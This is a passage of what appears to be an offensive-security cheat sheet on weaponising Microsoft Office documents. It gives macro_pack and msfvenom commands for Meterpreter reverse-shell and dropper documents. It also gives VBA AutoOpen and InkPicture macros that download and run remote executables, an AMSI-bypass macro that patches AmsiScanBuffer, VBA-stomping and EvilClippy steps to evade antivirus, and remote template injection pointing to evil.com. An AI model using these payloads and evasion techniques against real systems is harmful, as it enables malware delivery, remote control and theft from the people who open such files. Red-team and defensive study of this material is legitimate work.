</span><span class="c"># Download and execute a file</span><span class="w">
</span><span class="n">echo</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">file_to_drop_url</span><span class="err">&gt;</span><span class="w"> </span><span class="s2">"&lt;download_path&gt;"</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">macro_pack.exe</span><span class="w"> </span><span class="nt">-t</span><span class="w"> </span><span class="nx">DROPPER</span><span class="w"> </span><span class="nt">-o</span><span class="w"> </span><span class="nt">-G</span><span class="w"> </span><span class="nx">dropper.xls</span><span class="w">

</span><span class="c"># Meterpreter reverse TCP template using MacroMeter by Cn33liz</span><span class="w">
</span><span class="n">echo</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">ip</span><span class="err">&gt;</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">port</span><span class="err">&gt;</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">macro_pack.exe</span><span class="w"> </span><span class="nt">-t</span><span class="w"> </span><span class="nx">METERPRETER</span><span class="w"> </span><span class="nt">-o</span><span class="w"> </span><span class="nt">-G</span><span class="w"> </span><span class="nx">meter.docm</span><span class="w">

</span><span class="c"># Drop and execute embedded file</span><span class="w">
</span><span class="n">macro_pack.exe</span><span class="w"> </span><span class="nt">-t</span><span class="w"> </span><span class="nx">EMBED_EXE</span><span class="w"> </span><span class="nt">--embed</span><span class="o">=</span><span class="n">c:\windows\system32\calc.exe</span><span class="w"> </span><span class="nt">-o</span><span class="w"> </span><span class="nt">-G</span><span class="w"> </span><span class="nx">my_calc.vbs</span><span class="w">

</span><span class="c"># Obfuscate the vba file generated by msfvenom and put result in a new vba file.</span><span class="w">
</span><span class="n">msfvenom</span><span class="w"> </span><span class="nt">-p</span><span class="w"> </span><span class="nx">windows/meterpreter/reverse_tcp</span><span class="w"> </span><span class="nx">LHOST</span><span class="o">=</span><span class="mf">192.168</span><span class="o">.</span><span class="nf">0</span><span class="o">.</span><span class="nf">5</span><span class="w"> </span><span class="nt">-f</span><span class="w"> </span><span class="n">vba</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">macro_pack.exe</span><span class="w"> </span><span class="nt">-o</span><span class="w"> </span><span class="nt">-G</span><span class="w"> </span><span class="nx">meterobf.vba</span><span class="w">

</span><span class="c"># Obfuscate Empire stager vba file and generate a MS Word document:</span><span class="w">
</span><span class="n">macro_pack.exe</span><span class="w"> </span><span class="nt">-f</span><span class="w"> </span><span class="nx">empire.vba</span><span class="w"> </span><span class="nt">-o</span><span class="w"> </span><span class="nt">-G</span><span class="w"> </span><span class="nx">myDoc.docm</span><span class="w">

</span><span class="c"># Generate an MS Excel file containing an obfuscated dropper (download payload.exe and store as dropped.exe)</span><span class="w">
</span><span class="n">echo</span><span class="w"> </span><span class="s2">"https://myurl.url/payload.exe"</span><span class="w"> </span><span class="s2">"dropped.exe"</span><span class="w"> </span><span class="o">|</span><span class="w">  </span><span class="n">macro_pack.exe</span><span class="w"> </span><span class="nt">-o</span><span class="w"> </span><span class="nt">-t</span><span class="w"> </span><span class="nx">DROPPER</span><span class="w"> </span><span class="nt">-G</span><span class="w"> </span><span class="s2">"drop.xlsm"</span><span class="w"> 

</span><span class="c"># Execute calc.exe via Dynamic Data Exchange (DDE) attack</span><span class="w">
</span><span class="n">echo</span><span class="w"> </span><span class="nx">calc.exe</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">macro_pack.exe</span><span class="w"> </span><span class="nt">--dde</span><span class="w"> </span><span class="nt">-G</span><span class="w"> </span><span class="nx">calc.xslx</span><span class="w">

</span><span class="c"># Download and execute file via powershell using Dynamic Data Exchange (DDE) attack</span><span class="w">
</span><span class="n">macro_pack.exe</span><span class="w"> </span><span class="nt">--dde</span><span class="w"> </span><span class="nt">-f</span><span class="w"> </span><span class="o">..</span><span class="nx">\resources\community\ps_dl_exec.cmd</span><span class="w"> </span><span class="nt">-G</span><span class="w"> </span><span class="nx">DDE.xsl</span><span class="w">

</span><span class="c"># PRO: Generate a Word file containing VBA self encoded x64 reverse meterpreter VBA payload (will bypass most AV).</span><span class="w">
</span><span class="n">msfvenom.bat</span><span class="w"> </span><span class="nt">-p</span><span class="w"> </span><span class="nx">windows/x64/meterpreter/reverse_tcp</span><span class="w"> </span><span class="nx">LHOST</span><span class="o">=</span><span class="mf">192.168</span><span class="o">.</span><span class="nf">0</span><span class="o">.</span><span class="nf">5</span><span class="w"> </span><span class="nt">-f</span><span class="w"> </span><span class="n">vba</span><span class="w"> </span><span class="o">|</span><span class="w">  </span><span class="n">macro_pack.exe</span><span class="w"> </span><span class="nt">-o</span><span class="w"> </span><span class="nt">--autopack</span><span class="w"> </span><span class="nt">--keep-alive</span><span class="w">  </span><span class="nt">-G</span><span class="w">  </span><span class="nx">out.docm</span><span class="w">

</span><span class="c"># PRO: Trojan a PowerPoint file with a reverse meterpreter. Macro is obfuscated and mangled to bypass AMSI and most antiviruses.</span><span class="w">
</span><span class="n">msfvenom.bat</span><span class="w"> </span><span class="nt">-p</span><span class="w"> </span><span class="nx">windows/meterpreter/reverse_tcp</span><span class="w"> </span><span class="nx">LHOST</span><span class="o">=</span><span class="mf">192.168</span><span class="o">.</span><span class="nf">0</span><span class="o">.</span><span class="nf">5</span><span class="w"> </span><span class="nt">-f</span><span class="w"> </span><span class="n">vba</span><span class="w"> </span><span class="o">|</span><span class="w">  </span><span class="n">macro_pack.exe</span><span class="w"> </span><span class="nt">-o</span><span class="w"> </span><span class="nt">--autopack</span><span class="w"> </span><span class="nt">--trojan</span><span class="w"> </span><span class="nt">-G</span><span class="w">  </span><span class="nx">hotpics.pptm</span><span class="w">

</span><span class="c"># PRO: Generate an HTA payload able to run a shellcode via Excel injection</span><span class="w">
</span><span class="n">echo</span><span class="w"> </span><span class="nx">meterx86.bin</span><span class="w"> </span><span class="nx">meterx64.bin</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">macro_pack.exe</span><span class="w"> </span><span class="nt">-t</span><span class="w"> </span><span class="nx">AUTOSHELLCODE</span><span class="w">  </span><span class="nt">--run-in-excel</span><span class="w"> </span><span class="nt">-o</span><span class="w"> </span><span class="nt">-G</span><span class="w"> </span><span class="nx">samples\nicepic.hta</span><span class="w">
</span><span class="n">echo</span><span class="w"> </span><span class="nx">meterx86.bin</span><span class="w"> </span><span class="nx">meterx64.bin</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">macro_pack.exe</span><span class="w"> </span><span class="nt">-t</span><span class="w"> </span><span class="nx">AUTOSHELLCODE</span><span class="w"> </span><span class="nt">-o</span><span class="w"> </span><span class="nt">--hta-macro</span><span class="w"> </span><span class="nt">--run-in-excel</span><span class="w"> </span><span class="nt">-G</span><span class="w"> </span><span class="nx">samples\my_shortcut.lnk</span><span class="w">

</span><span class="c"># PRO: XLM Injection</span><span class="w">
</span><span class="n">echo</span><span class="w"> </span><span class="s2">"MPPro"</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">macro_pack.exe</span><span class="w"> </span><span class="nt">-G</span><span class="w"> </span><span class="nx">_samples\hello.doc</span><span class="w"> </span><span class="nt">-t</span><span class="w"> </span><span class="nx">HELLO</span><span class="w"> </span><span class="nt">--xlm</span><span class="w"> </span><span class="nt">--run-in-excel</span><span class="w">

</span><span class="c"># PRO: ShellCode Exec - Heap Injection, AlternativeInjection</span><span class="w">
</span><span class="n">echo</span><span class="w"> </span><span class="s2">"x32calc.bin"</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">macro_pack.exe</span><span class="w"> </span><span class="nt">-t</span><span class="w"> </span><span class="nx">SHELLCODE</span><span class="w"> </span><span class="nt">-o</span><span class="w"> </span><span class="nt">--shellcodemethod</span><span class="o">=</span><span class="n">HeapInjection</span><span class="w"> </span><span class="nt">-G</span><span class="w"> </span><span class="nx">test.doc</span><span class="w">
</span><span class="n">echo</span><span class="w"> </span><span class="s2">"x32calc.bin"</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">macro_pack.exe</span><span class="w"> </span><span class="nt">-t</span><span class="w"> </span><span class="nx">SHELLCODE</span><span class="w"> </span><span class="nt">-o</span><span class="w"> </span><span class="nt">--shellcodemethod</span><span class="o">=</span><span class="n">AlternativeInjection</span><span class="w"> </span><span class="nt">--background</span><span class="w"> </span><span class="nt">-G</span><span class="w"> </span><span class="nx">test.doc</span><span class="w">

</span><span class="c"># PRO: More shellcodes</span><span class="w">
</span><span class="n">echo</span><span class="w"> </span><span class="nx">x86.bin</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">macro_pack.exe</span><span class="w"> </span><span class="nt">-t</span><span class="w"> </span><span class="nx">SHELLCODE</span><span class="w"> </span><span class="nt">-o</span><span class="w"> </span><span class="nt">-G</span><span class="w"> </span><span class="nx">test.pptm</span><span class="w"> </span><span class="err">–</span><span class="nx">keep-alive</span><span class="w">
</span><span class="n">echo</span><span class="w"> </span><span class="s2">"x86.bin"</span><span class="w"> </span><span class="s2">"x64.bin"</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">macro_pack.exe</span><span class="w"> </span><span class="nt">-t</span><span class="w"> </span><span class="nx">AUTOSHELLCODE</span><span class="w"> </span><span class="nt">-o</span><span class="w"> </span><span class="err">–</span><span class="nx">autopack</span><span class="w"> </span><span class="nt">-G</span><span class="w"> </span><span class="nx">sc_auto.doc</span><span class="w">
</span><span class="n">echo</span><span class="w"> </span><span class="s2">"http://192.168.5.10:8080/x32calc.bin"</span><span class="w"> </span><span class="s2">"http://192.168.5.10:8080/x64calc.bin"</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">macro_pack.exe</span><span class="w"> </span><span class="nt">-t</span><span class="w"> </span><span class="nx">DROPPER_SHELLCODE</span><span class="w"> </span><span class="nt">-o</span><span class="w"> </span><span class="nt">--shellcodemethod</span><span class="o">=</span><span class="n">ClassicIndirect</span><span class="w"> </span><span class="nt">-G</span><span class="w"> </span><span class="nx">samples\sc_dl.xls</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<h2 id="docm---cactustorch-vba-module">DOCM - CACTUSTORCH VBA Module</h2>

<blockquote>
  <p>CactusTorch is leveraging the DotNetToJscript technique to load a .Net compiled binary into memory and execute it from vbscript</p>
</blockquote>

<ul>
  <li>https://github.com/mdsecactivebreach/CACTUSTORCH</li>
  <li>https://github.com/tyranid/DotNetToJScript/</li>
  <li>CACTUSTORCH - DotNetToJScript all the things - https://youtu.be/YiaKb8nHFSY</li>
  <li>CACTUSTORCH - CobaltStrike Aggressor Script Addon - https://www.youtube.com/watch?v=_pwH6a-6yAQ</li>
</ul>

<ol>
  <li>Import <strong>.cna</strong> in Cobalt Strike</li>
  <li>Generate a new VBA payload from the CACTUSTORCH menu</li>
  <li>Download DotNetToJscript</li>
  <li>Compile it
    <ul>
      <li><strong>DotNetToJscript.exe</strong> - responsible for bootstrapping C# binaries (supplied as input) and converting them to JavaScript or VBScript</li>
      <li><strong>ExampleAssembly.dll</strong> - the C# assembly that will be given to DotNetToJscript.exe. In default project configuration, the assembly just pops a message box with the text “test”</li>
    </ul>
  </li>
  <li>Execute <strong>DotNetToJscript.exe</strong> and supply it with the ExampleAssembly.dll, specify the output file and the output type
    <pre><code class="language-ps1"> DotNetToJScript.exeExampleAssembly.dll -l vba -o test.vba -c cactusTorch
</code></pre>
  </li>
  <li>Use the generated code to replace the hardcoded binary in CactusTorch</li>
</ol>

<h2 id="docm---mmg-with-custom-dl--exec">DOCM - MMG with Custom DL + Exec</h2>

<ol>
  <li>Custom Download in first Macro to “C:\Users\Public\beacon.exe”</li>
  <li>Create a custom binary execute using MMG</li>
  <li>Merge both Macro</li>
</ol>

<pre><code class="language-ps1">git clone https://github.com/Mr-Un1k0d3r/MaliciousMacroGenerator
python MMG.py configs/generic-cmd.json malicious.vba
{
	"description": "Generic command exec payload\nEvasion technique set to none",
	"template": "templates/payloads/generic-cmd-template.vba",
	"varcount": 152,
	"encodingoffset": 5,
	"chunksize": 180,
	"encodedvars": 	{},
	"vars": 	[],
	"evasion": 	["encoder"],
	"payload": "cmd.exe /c C:\\Users\\Public\\beacon.exe"
}
</code></pre>

<div class="language-vb highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre></td><td class="rouge-code"><pre><span class="k">Private</span> <span class="k">Declare</span> <span class="n">PtrSafe</span> <span class="k">Function</span> <span class="nf">URLDownloadToFile</span> <span class="k">Lib</span> <span class="s">"urlmon"</span> <span class="k">Alias</span> <span class="s">"URLDownloadToFileA"</span> <span class="p">(</span><span class="k">ByVal</span> <span class="n">pCaller</span> <span class="ow">As</span> <span class="kt">Long</span><span class="p">,</span> <span class="k">ByVal</span> <span class="n">szURL</span> <span class="ow">As</span> <span class="kt">String</span><span class="p">,</span> <span class="k">ByVal</span> <span class="n">szFileName</span> <span class="ow">As</span> <span class="kt">String</span><span class="p">,</span> <span class="k">ByVal</span> <span class="n">dwReserved</span> <span class="ow">As</span> <span class="kt">Long</span><span class="p">,</span> <span class="k">ByVal</span> <span class="n">lpfnCB</span> <span class="ow">As</span> <span class="kt">Long</span><span class="p">)</span> <span class="ow">As</span> <span class="kt">Long</span>

<span class="k">Public</span> <span class="k">Function</span> <span class="nf">DownloadFileA</span><span class="p">(</span><span class="k">ByVal</span> <span class="n">URL</span> <span class="ow">As</span> <span class="kt">String</span><span class="p">,</span> <span class="k">ByVal</span> <span class="n">DownloadPath</span> <span class="ow">As</span> <span class="kt">String</span><span class="p">)</span> <span class="ow">As</span> <span class="kt">Boolean</span>
    <span class="k">On</span> <span class="k">Error</span> <span class="k">GoTo</span> <span class="n">Failed</span>
    <span class="n">DownloadFileA</span> <span class="o">=</span> <span class="k">False</span>
    <span class="c1">'As directory must exist, this is a check</span>
    <span class="k">If</span> <span class="n">CreateObject</span><span class="p">(</span><span class="s">"Scripting.FileSystemObject"</span><span class="p">).</span><span class="n">FolderExists</span><span class="p">(</span><span class="n">CreateObject</span><span class="p">(</span><span class="s">"Scripting.FileSystemObject"</span><span class="p">).</span><span class="n">GetParentFolderName</span><span class="p">(</span><span class="n">DownloadPath</span><span class="p">))</span> <span class="o">=</span> <span class="k">False</span> <span class="k">Then</span> <span class="k">Exit</span> <span class="k">Function</span>
    <span class="nf">Dim</span> <span class="n">returnValue</span> <span class="ow">As</span> <span class="kt">Long</span>
    <span class="n">returnValue</span> <span class="o">=</span> <span class="n">URLDownloadToFile</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">URL</span><span class="p">,</span> <span class="n">DownloadPath</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
    <span class="c1">'If return value is 0 and the file exist, then it is considered as downloaded correctly</span>
    <span class="n">DownloadFileA</span> <span class="o">=</span> <span class="p">(</span><span class="n">returnValue</span> <span class="o">=</span> <span class="mi">0</span><span class="p">)</span> <span class="ow">And</span> <span class="p">(</span><span class="n">Len</span><span class="p">(</span><span class="n">Dir</span><span class="p">(</span><span class="n">DownloadPath</span><span class="p">))</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span>
    <span class="k">Exit</span> <span class="k">Function</span>

<span class="nf">Failed</span><span class="p">:</span>
<span class="k">End</span> <span class="k">Function</span>

<span class="k">Sub</span> <span class="nf">AutoOpen</span><span class="p">()</span>
    <span class="n">DownloadFileA</span> <span class="s">"http://10.10.10.10/macro.exe"</span><span class="p">,</span> <span class="s">"C:\\Users\\Public\\beacon.exe"</span>
<span class="k">End</span> <span class="k">Sub</span>


<span class="k">Sub</span> <span class="nf">Auto_Open</span><span class="p">()</span>
    <span class="n">DownloadFileA</span> <span class="s">"http://10.10.10.10/macro.exe"</span><span class="p">,</span> <span class="s">"C:\\Users\\Public\\beacon.exe"</span>
<span class="k">End</span> <span class="k">Sub</span>
</pre></td></tr></tbody></table></code></div></div>

<h2 id="docm---activex-based-inkpicture-control-painted-event-autorun-macro">DOCM - ActiveX-based (InkPicture control, Painted event) Autorun macro</h2>

<p>Go to <strong>Developer tab</strong> on ribbon <code class="language-plaintext highlighter-rouge">-&gt; Insert -&gt; More Controls -&gt; Microsoft InkPicture Control</code></p>

<div class="language-vb highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre><span class="k">Private</span> <span class="k">Sub</span> <span class="nf">InkPicture1_Painted</span><span class="p">(</span><span class="k">ByVal</span> <span class="n">hDC</span> <span class="ow">As</span> <span class="kt">Long</span><span class="p">,</span> <span class="k">ByVal</span> <span class="n">Rect</span> <span class="ow">As</span> <span class="n">MSINKAUTLib</span><span class="p">.</span><span class="n">IInkRectangle</span><span class="p">)</span>
<span class="n">Run</span> <span class="o">=</span> <span class="n">Shell</span><span class="p">(</span><span class="s">"cmd.exe /c PowerShell (New-Object System.Net.WebClient).DownloadFile('https://&lt;host&gt;/file.exe','file.exe');Start-Process 'file.exe'"</span><span class="p">,</span> <span class="n">vbNormalFocus</span><span class="p">)</span>
<span class="k">End</span> <span class="k">Sub</span>
</pre></td></tr></tbody></table></code></div></div>

<h2 id="vba-obfuscation">VBA Obfuscation</h2>

<pre><code class="language-ps1"># https://www.youtube.com/watch?v=L0DlPOLx2k0
$ git clone https://github.com/bonnetn/vba-obfuscator
$ cat example_macro/download_payload.vba | docker run -i --rm bonnetn/vba-obfuscator /dev/stdin
</code></pre>

<h2 id="vba-purging">VBA Purging</h2>

<p><strong>VBA Stomping</strong>: This technique allows attackers to remove compressed VBA code from Office documents and still execute malicious macros without many of the VBA keywords that AV engines had come to rely on for detection. == Removes P-code.</p>

<p>:warning: VBA stomping is not effective against Excel 97-2003 Workbook (.xls) format.</p>

<h3 id="officepurge">OfficePurge</h3>
<ul>
  <li>https://github.com/fireeye/OfficePurge/releases/download/v1.0/OfficePurge.exe</li>
</ul>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre><span class="n">OfficePurge.exe</span><span class="w"> </span><span class="nt">-d</span><span class="w"> </span><span class="nx">word</span><span class="w"> </span><span class="nt">-f</span><span class="w"> </span><span class="o">.</span><span class="nx">\malicious.doc</span><span class="w"> </span><span class="nt">-m</span><span class="w"> </span><span class="nx">NewMacros</span><span class="w">
</span><span class="n">OfficePurge.exe</span><span class="w"> </span><span class="nt">-d</span><span class="w"> </span><span class="nx">excel</span><span class="w"> </span><span class="nt">-f</span><span class="w"> </span><span class="o">.</span><span class="nx">\payroll.xls</span><span class="w"> </span><span class="nt">-m</span><span class="w"> </span><span class="nx">Module1</span><span class="w">
</span><span class="n">OfficePurge.exe</span><span class="w"> </span><span class="nt">-d</span><span class="w"> </span><span class="nx">publisher</span><span class="w"> </span><span class="nt">-f</span><span class="w"> </span><span class="o">.</span><span class="nx">\donuts.pub</span><span class="w"> </span><span class="nt">-m</span><span class="w"> </span><span class="nx">ThisDocument</span><span class="w">
</span><span class="n">OfficePurge.exe</span><span class="w"> </span><span class="nt">-d</span><span class="w"> </span><span class="nx">word</span><span class="w"> </span><span class="nt">-f</span><span class="w"> </span><span class="o">.</span><span class="nx">\malicious.doc</span><span class="w"> </span><span class="nt">-l</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<h3 id="evilclippy">EvilClippy</h3>

<blockquote>
  <p>Evil Clippy uses the OpenMCDF library to manipulate CFBF files. 
Evil Clippy compiles perfectly fine with the Mono C# compiler and has been tested on Linux, OSX and Windows.
If you want to manipulate CFBF files manually, then FlexHEX is one of the best editors for this.</p>
</blockquote>

<pre><code class="language-ps1"># OSX/Linux
mcs /reference:OpenMcdf.dll,System.IO.Compression.FileSystem.dll /out:EvilClippy.exe *.cs 
# Windows
csc /reference:OpenMcdf.dll,System.IO.Compression.FileSystem.dll /out:EvilClippy.exe *.cs 

EvilClippy.exe -s fake.vbs -g -r cobaltstrike.doc
EvilClippy.exe -s fakecode.vba -t 2016x86 macrofile.doc
EvilClippy.exe -s fakecode.vba -t 2013x64 macrofile.doc

# make macro code unaccessible is to mark the project as locked and unviewable: -u
# Evil Clippy can confuse pcodedmp and many other analysis tools with the -r flag.
EvilClippy.exe -r macrofile.doc
</code></pre>

<h2 id="vba---offensive-security-template">VBA - Offensive Security Template</h2>

<ul>
  <li>Reverse Shell VBA - https://github.com/JohnWoodman/VBA-Macro-Reverse-Shell/blob/main/VBA-Reverse-Shell.vba</li>
  <li>Process Dumper - https://github.com/JohnWoodman/VBA-Macro-Dump-Process</li>
  <li>RunPE - https://github.com/itm4n/VBA-RunPE</li>
  <li>Spoof Parent - https://github.com/py7hagoras/OfficeMacro64</li>
  <li>AMSI Bypass - https://github.com/outflanknl/Scripts/blob/master/AMSIbypasses.vba</li>
  <li>amsiByPassWithRTLMoveMemory - https://gist.github.com/DanShaqFu/1c57c02660b2980d4816d14379c2c4f3</li>
  <li>VBA macro spawning a process with a spoofed parent - https://github.com/christophetd/spoofing-office-macro/blob/master/macro64.vba</li>
</ul>

<h2 id="vba---amsi">VBA - AMSI</h2>

<blockquote>
  <p>The Office VBA integration with AMSI is made up of three parts: (a) logging macro behavior, (b) triggering a scan on suspicious behavior, and (c) stopping a malicious macro upon detection. https://www.microsoft.com/security/blog/2018/09/12/office-vba-amsi-parting-the-veil-on-malicious-macros/</p>
</blockquote>

<p><img data-proofer-ignore data-src="https://www.microsoft.com/security/blog/wp-content/uploads/2018/09/fig2-runtime-scanning-amsi-8-1024x482.png" alt="" /></p>

<p>:warning: It appears that p-code based attacks where the VBA code is stomped will still be picked up by the AMSI engine (e.g. files manipulated by our tool EvilClippy).</p>

<p>The AMSI engine only hooks into VBA, we can bypass it by using Excel 4.0 Macro</p>

<ul>
  <li>AMSI Trigger - https://github.com/synacktiv/AMSI-Bypass</li>
</ul>

<div class="language-vb highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre></td><td class="rouge-code"><pre><span class="k">Private</span> <span class="k">Declare</span> <span class="n">PtrSafe</span> <span class="k">Function</span> <span class="nf">GetProcAddress</span> <span class="k">Lib</span> <span class="s">"kernel32"</span> <span class="p">(</span><span class="k">ByVal</span> <span class="n">hModule</span> <span class="ow">As</span> <span class="n">LongPtr</span><span class="p">,</span> <span class="k">ByVal</span> <span class="n">lpProcName</span> <span class="ow">As</span> <span class="kt">String</span><span class="p">)</span> <span class="ow">As</span> <span class="n">LongPtr</span>
<span class="k">Private</span> <span class="k">Declare</span> <span class="n">PtrSafe</span> <span class="k">Function</span> <span class="nf">LoadLibrary</span> <span class="k">Lib</span> <span class="s">"kernel32"</span> <span class="k">Alias</span> <span class="s">"LoadLibraryA"</span> <span class="p">(</span><span class="k">ByVal</span> <span class="n">lpLibFileName</span> <span class="ow">As</span> <span class="kt">String</span><span class="p">)</span> <span class="ow">As</span> <span class="n">LongPtr</span>
<span class="k">Private</span> <span class="k">Declare</span> <span class="n">PtrSafe</span> <span class="k">Function</span> <span class="nf">VirtualProtect</span> <span class="k">Lib</span> <span class="s">"kernel32"</span> <span class="p">(</span><span class="n">lpAddress</span> <span class="ow">As</span> <span class="n">Any</span><span class="p">,</span> <span class="k">ByVal</span> <span class="n">dwSize</span> <span class="ow">As</span> <span class="n">LongPtr</span><span class="p">,</span> <span class="k">ByVal</span> <span class="n">flNewProtect</span> <span class="ow">As</span> <span class="kt">Long</span><span class="p">,</span> <span class="n">lpflOldProtect</span> <span class="ow">As</span> <span class="kt">Long</span><span class="p">)</span> <span class="ow">As</span> <span class="kt">Long</span>
<span class="k">Private</span> <span class="k">Declare</span> <span class="n">PtrSafe</span> <span class="k">Sub</span> <span class="nf">CopyMemory</span> <span class="k">Lib</span> <span class="s">"kernel32"</span> <span class="k">Alias</span> <span class="s">"RtlMoveMemory"</span> <span class="p">(</span><span class="n">Destination</span> <span class="ow">As</span> <span class="n">Any</span><span class="p">,</span> <span class="n">Source</span> <span class="ow">As</span> <span class="n">Any</span><span class="p">,</span> <span class="k">ByVal</span> <span class="n">Length</span> <span class="ow">As</span> <span class="n">LongPtr</span><span class="p">)</span>
 
<span class="k">Private</span> <span class="k">Sub</span> <span class="nf">Document_Open</span><span class="p">()</span>
    <span class="k">Dim</span> <span class="nv">AmsiDLL</span> <span class="ow">As</span> <span class="n">LongPtr</span>
    <span class="k">Dim</span> <span class="nv">AmsiScanBufferAddr</span> <span class="ow">As</span> <span class="n">LongPtr</span>
    <span class="k">Dim</span> <span class="nv">result</span> <span class="ow">As</span> <span class="kt">Long</span>
    <span class="k">Dim</span> <span class="nv">MyByteArray</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span> <span class="ow">As</span> <span class="kt">Byte</span>
    <span class="k">Dim</span> <span class="nv">ArrayPointer</span> <span class="ow">As</span> <span class="n">LongPtr</span>
 
    <span class="n">MyByteArray</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">=</span> <span class="mi">184</span> <span class="c1">' 0xB8</span>
    <span class="n">MyByteArray</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">=</span> <span class="mi">87</span>  <span class="c1">' 0x57</span>
    <span class="n">MyByteArray</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0</span>   <span class="c1">' 0x00</span>
    <span class="n">MyByteArray</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span> <span class="o">=</span> <span class="mi">7</span>   <span class="c1">' 0x07</span>
    <span class="n">MyByteArray</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span> <span class="o">=</span> <span class="mi">128</span> <span class="c1">' 0x80</span>
    <span class="n">MyByteArray</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span> <span class="o">=</span> <span class="mi">195</span> <span class="c1">' 0xC3</span>
 
    <span class="n">AmsiDLL</span> <span class="o">=</span> <span class="n">LoadLibrary</span><span class="p">(</span><span class="s">"amsi.dll"</span><span class="p">)</span>
    <span class="n">AmsiScanBufferAddr</span> <span class="o">=</span> <span class="n">GetProcAddress</span><span class="p">(</span><span class="n">AmsiDLL</span><span class="p">,</span> <span class="s">"AmsiScanBuffer"</span><span class="p">)</span>
    <span class="n">result</span> <span class="o">=</span> <span class="n">VirtualProtect</span><span class="p">(</span><span class="k">ByVal</span> <span class="n">AmsiScanBufferAddr</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">64</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
    <span class="n">ArrayPointer</span> <span class="o">=</span> <span class="n">VarPtr</span><span class="p">(</span><span class="n">MyByteArray</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span>
    <span class="n">CopyMemory</span> <span class="k">ByVal</span> <span class="n">AmsiScanBufferAddr</span><span class="p">,</span> <span class="k">ByVal</span> <span class="n">ArrayPointer</span><span class="p">,</span> <span class="mi">6</span>
     
<span class="k">End</span> <span class="k">Sub</span>
</pre></td></tr></tbody></table></code></div></div>

<h2 id="docx---template-injection">DOCX - Template Injection</h2>

<p>:warning: Does not require “Enable Macro”</p>

<h3 id="remote-template">Remote Template</h3>

<ol>
  <li>A malicious macro is saved in a Word template .dotm file</li>
  <li>Benign .docx file is created based on one of the default MS Word Document templates</li>
  <li>Document from step 2 is saved as .docx</li>
  <li>Document from step 3 is renamed to .zip</li>
  <li>Document from step 4 gets unzipped</li>
  <li><strong>.\word_rels\settings.xml.rels</strong> contains a reference to the template file. That reference gets replaced with a reference to our malicious macro created in step 1. File can be hosted on a web server (http) or webdav (smb).
    <div class="language-xml highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre> <span class="cp">&lt;?xml version="1.0" encoding="UTF-8" standalone="yes"?&gt;</span>
 <span class="nt">&lt;Relationships</span> <span class="na">xmlns=</span><span class="s">"http://schemas.openxmlformats.org/package/2006/relationships"</span><span class="nt">&gt;&lt;Relationship</span> <span class="na">Id=</span><span class="s">"rId1"</span> <span class="na">Type=</span><span class="s">"http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate"</span> <span class="na">Target=</span><span class="s">"file:///C:\Users\mantvydas\AppData\Roaming\Microsoft\Templates\Polished%20resume,%20designed%20by%20MOO.dotx"</span> <span class="na">TargetMode=</span><span class="s">"External"</span><span class="nt">/&gt;&lt;/Relationships&gt;</span>
</pre></td></tr></tbody></table></code></div>    </div>
    <div class="language-xml highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre> <span class="cp">&lt;?xml version="1.0" encoding="UTF-8" standalone="yes"?&gt;</span><span class="nt">&lt;Relationships</span> <span class="na">xmlns=</span><span class="s">"http://schemas.openxmlformats.org/package/2006/relationships"</span><span class="nt">&gt;&lt;Relationship</span> <span class="na">Id=</span><span class="s">"rId1"</span> <span class="na">Type=</span><span class="s">"http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate"</span>
 <span class="na">Target=</span><span class="s">"https://evil.com/malicious.dotm"</span> <span class="na">TargetMode=</span><span class="s">"External"</span><span class="nt">/&gt;&lt;/Relationships&gt;</span>
</pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li>File gets zipped back up again and renamed to .docx</li>
</ol>

